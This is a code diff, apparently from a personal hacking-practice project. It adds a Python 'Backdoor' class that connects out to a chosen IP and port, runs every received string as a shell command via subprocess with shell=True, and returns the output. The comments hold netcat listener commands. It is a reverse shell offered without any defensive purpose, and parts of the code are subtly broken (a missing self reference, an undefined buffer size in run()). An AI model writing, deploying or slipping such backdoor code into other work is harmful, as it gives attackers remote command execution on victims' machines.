@@ -6,6 +6,40 @@ import socket, subprocess
 #nc -vv -l -p 4444
 #netcat --veryverbose -listen -port ####
 
+class Backdoor:
+    def __init__ (self, ip, port, buffer_size): #constructor method
+        self.connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
+        self.connection.connect((ip, port)) #connect method from connection variable
+        
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+    
+    def run(self):
+        while True:
+            command = self.connection.recv(buffer_size) #receive, specify buffer size
+            command_result = execute_system_command(command)
+            self.connection.send(command_result)
+        connection.close()
+    
+ip = raw_input("Enter IP Address: ")
+port = int(raw_input("Enter port number to use: "))
+buffer_size = int(raw_input("Enter buffer size: "))
+
+my_backdoor = Backdoor(ip, port, buffer_size)
+my_backdoor.run()
+
+#connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
+
+############################################################################
+###Commented code below###
+#!/usr/bin/env python
+
+import socket, subprocess
+
+#to open listening connection on target computer using netcat:
+#nc -vv -l -p 4444
+#netcat --veryverbose -listen -port ####
+
 def execute_system_command(command):
     return subprocess.check_output(command, shell=True) #system command is a shell not a list so shell needs to be set to true
     #subprocess.check_output returns result, need to either store it as a var or return it
@@ -36,11 +70,6 @@ connection.close()
 
 
 
-
-
-
-############################################################################
-###Commented code below###
 #!/usr/bin/env python3
 
 import socket
